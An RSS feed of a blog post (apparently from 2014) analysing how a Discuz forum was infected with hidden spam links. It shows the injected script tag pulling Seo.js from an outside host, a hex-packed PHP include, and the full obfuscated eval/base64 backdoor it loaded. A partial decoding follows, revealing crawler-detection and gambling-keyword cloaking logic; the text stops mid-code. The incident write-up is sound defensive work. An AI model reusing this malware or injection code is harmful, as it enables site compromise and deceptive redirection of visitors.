<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>discuz - 看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com/tag/discuz.xml</link>
        <lastBuildDate>Wed, 23 Mar 2016 09:22:15 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>discuz - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/tag/discuz.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>技术</category>
        <item>
            <title><![CDATA[论坛被挂暗链问题分析与解决]]></title>
            <link>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</link>
            <guid>/article/8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html</guid>
            <pubDate>Tue, 01 Apr 2014 13:38:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #de935f;">div</span> <span style="color: #f0c674;">style</span>='display:none'&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">language</span>='javascript' <span style="color: #f0c674;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #f0c674;">&amp;logo</span>=1' <span style="color: #f0c674;">charset</span>='gb2312'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;&lt;/<span style="color: #de935f;">div</span>&gt;&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>='text/javascript' <span style="color: #f0c674;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #81a2be;">INCLUDE</span>(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #8abeb7;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">O00OO0</span>=urldecode(<span style="color: #8abeb7;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #8abeb7; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{6}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{33}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{10}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{18}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{3}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{0}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{1}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{24};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{7}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{13};</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{22}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{36}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{29}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{32}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{35}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{26}.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{30};</span><span style="color: #b5bd68; text-decoration: underline;">eval</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #969896; font-style: italic;">/*</span>
<span style="color: #969896; font-style: italic;">*author:whoami</span>
<span style="color: #969896; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #969896; font-style: italic;">*/</span>
error_reporting(0);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span> = <span style="color: #8abeb7;">'/var/tmp/.SYSDUMP/'</span>;
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REMOTE_ADDR'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_USER_AGENT'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'117.28.255.37'</span>,<span style="color: #8abeb7;">'116.55.241.24'</span>,<span style="color: #8abeb7;">'125.64.94.219'</span>,<span style="color: #8abeb7;">'119.147.114.213'</span>,<span style="color: #8abeb7;">'11</span><span style="color: #8abeb7; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Baiduspider'</span>,<span style="color: #8abeb7;">'Googlebot'</span>,<span style="color: #8abeb7;">'Yahoo'</span>,<span style="color: #8abeb7;">'Bingbot'</span>,<span style="color: #8abeb7;">'Sosospider'</span>,<span style="color: #8abeb7;">'Sogou'</span>,<span style="color: #8abeb7;">'36</span><span style="color: #8abeb7; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'anquan.org'</span>,<span style="color: #8abeb7;">'google.com'</span>,<span style="color: #8abeb7;">'soso.com'</span>,<span style="color: #8abeb7;">'%e8%b5%8c'</span>,<span style="color: #8abeb7;">'%e9%aa%b0'</span>,<span style="color: #8abeb7;">'%e9%b1%</span><span style="color: #8abeb7; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
